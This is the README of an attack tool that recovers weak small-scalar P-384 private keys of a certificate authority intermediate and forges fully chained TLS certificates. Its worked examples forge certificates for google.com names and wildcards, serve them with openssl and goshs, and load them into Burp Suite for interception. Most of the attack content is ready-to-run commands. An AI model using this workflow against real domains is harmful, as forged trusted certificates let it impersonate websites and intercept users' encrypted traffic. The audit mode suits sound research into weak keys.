# emudhra

**ec-small-scalar** attack tool for weak-keys on P-384: audit CA
keys, crack enumerable private scalars, and forge fully-chained TLS leaf
certificates.

## Install

Clone locally :


```bash
pipx install .          # or: pip install --user .
```

Requires Python ≥ 3.10 and `cryptography` (installed automatically).

## TLDR

Fullchain bundle + crack

```sh
python3 emudhra.py bundle --cn hacked.google.com --chain cas/EMSign-ECC-Root-CA-G3.crt.pem --ca-cert cas/EM-DV-TLS-CA-G3B.crt.pem --crack 1:1000 --days 365
```

Then use `certs/hacked.google.com/hacked.google.com.fullchain.pem` as certificate and `certs/hacked.google.com/hacked.google.com.key.pem` as key.

```sh
goshs -p 443 -s -sc certs/hacked.google.com/hacked.google.com.fullchain.pem -sk ./hacked.google.com/hacked.google.com.key.pem
```

Use in Burpsuite :

**Proxy > Proxy settings > Edit proxy listener > Certificate > Use a custom certificate** and select the `.p12` file. Default .p12 password is `emudhra`.

## Commands

| Command | What it does |
|---|---|
| `emudhra check <certs...> [--range 1:1024]` | prove a corpus of CA certs has enumerable scalars (k·G point matching, no attack) |
| `emudhra leaf` | mint a TLS server cert and a serve-ready bundle (fullchain + key + README) |
| `emudhra bundle` | `leaf` + package script, CA hierarchy and bundle into a distributable tar.gz |
| `emudhra forge [scalars]` | generate small-scalar keys + self-signed demo CA certs |
| `emudhra verify <keys...>` | report a key's scalar and flag the small-scalar class |

## Leaf signing modes

- `--ca-cert X --ca-key Y` — sign with a CA you own
- `--ca-cert X --crack 1:1000` — **recover** a weak CA key from its
  certificate (brute-force the scalar, check-style matching) and sign
- neither — auto-generate a fresh CA
- `--forge START:END` — additionally make the *leaf* key small-scalar

Full chains are assembled automatically (CA cert, its sibling certs,
`--chain` files, system trust store) and self-checked against the store.



Then use the fullchain 

## Forging for multiple domains at once

SANs stack in one certificate — apexes, `*.google.com`-style wildcards,
single-label names (`localhost`) and IPs:

```bash
emudhra leaf --ca-cert cas/EM-DV-TLS-CA-G3B.crt.pem --crack 1:1000 \
    --cn mrsheepsheep.google.com \
    --san mrsheepsheep.google.com \
    --san '*.google.com' --san google.com \
    --san '*.ctf.internal' \
    --san localhost --san 127.0.0.1
```

Caveats: a wildcard matches exactly one leftmost label, and clients reject
wildcards on public suffixes (`*.com`), so no single cert matches *every*
hostname — cover each registrable domain with one wildcard SAN.

## Example: crack a weak CA and serve a valid cert

Target domain: `mrsheepsheep.google.com`

```bash
emudhra check cas/ --range 1:1000                      # find the weak CA
emudhra leaf --ca-cert cas/EM-DV-TLS-CA-G3B.crt.pem \
    --crack 1:1000 --cn mrsheepsheep.google.com           # forge + auto-chain
```

`leaf` emits a serve-ready bundle in `certs/mrsheepsheep.google.com/`:

```
mrsheepsheep.google.com.server.pem      # fullchain + key, single file
mrsheepsheep.google.com.fullchain.pem   # leaf + intermediate + parent CA
mrsheepsheep.google.com.key.pem         # leaf private key
README.txt                              # serve/curl commands
```

The **fullchain** is what a server should present: the leaf alone fails strict
chain building (`unable to get local issuer certificate`), while the fullchain
lets clients walk up to the root they already trust — no `--cacert` needed.

Serve it:

```bash
# openssl (separate cert + key)
openssl s_server -accept 443 \
    -cert certs/mrsheepsheep.google.com/mrsheepsheep.google.com.fullchain.pem \
    -key certs/mrsheepsheep.google.com/mrsheepsheep.google.com.key.pem -www

# goshs
goshs -p 443 -s \
    -sc certs/mrsheepsheep.google.com/mrsheepsheep.google.com.fullchain.pem \
    -sk certs/mrsheepsheep.google.com/mrsheepsheep.google.com.key.pem

# or any stack that takes one PEM: use mrsheepsheep.google.com.server.pem
```

Client check — plain curl, no CA flags:

```bash
curl https://mrsheepsheep.google.com/ \
    --resolve 'mrsheepsheep.google.com:443:127.0.0.1'
```

## Fullchain example: anchoring at the ECC main CA

The auto-built fullchain reaches all the way up to the hierarchy's root —
`EMSign-ECC-Root-CA-G3` — without ever touching the strong keys on the way:

```
leaf (mrsheepsheep.google.com)
 └─ EM DV TLS CA - G3B          ← weak intermediate, scalar cracked (0x9c)
     └─ emSign Root TLS CA - G3 ← parent, strong key (public cert only)
         └─ emSign ECC Root CA - G3   ← ROOT / trust anchor
```

The emitted `fullchain.pem` contains leaf + weak intermediate + parent; the
root is deliberately **not** included (roots are trust anchors, not wire
material — clients must already trust it, via their store or `--cacert`).

Verify the whole chain against the root as the only trust anchor:

```bash
openssl verify -CAfile cas/EMSign-ECC-Root-CA-G3.crt.pem \
    -untrusted certs/mrsheepsheep.google.com/mrsheepsheep.google.com.fullchain.pem \
    certs/mrsheepsheep.google.com/mrsheepsheep.google.com.crt.pem
# → OK

# curl clients that don't have the root in their store can anchor on it:
curl https://mrsheepsheep.google.com/ \
    --resolve 'mrsheepsheep.google.com:443:127.0.0.1' \
    --cacert cas/EMSign-ECC-Root-CA-G3.crt.pem
```

Note that cracking only ever needed the *intermediate's* key: the parent and
root certs are public material fetched from the chain, and their keys stay
irrelevant — a CA hierarchy is only as strong as the weakest key that signs
leaves.

`bundle` produces a single tar.gz with the script, the CA hierarchy and the
forged bundle — drop it on a server or hand it to a teammate.

## Development

```bash
python3 emudhra.py <cmd> ...    # shim, works from the checkout
python3 -m emudhra <cmd> ...    # module form
pip install -e . && emudhra ...  # editable install
```
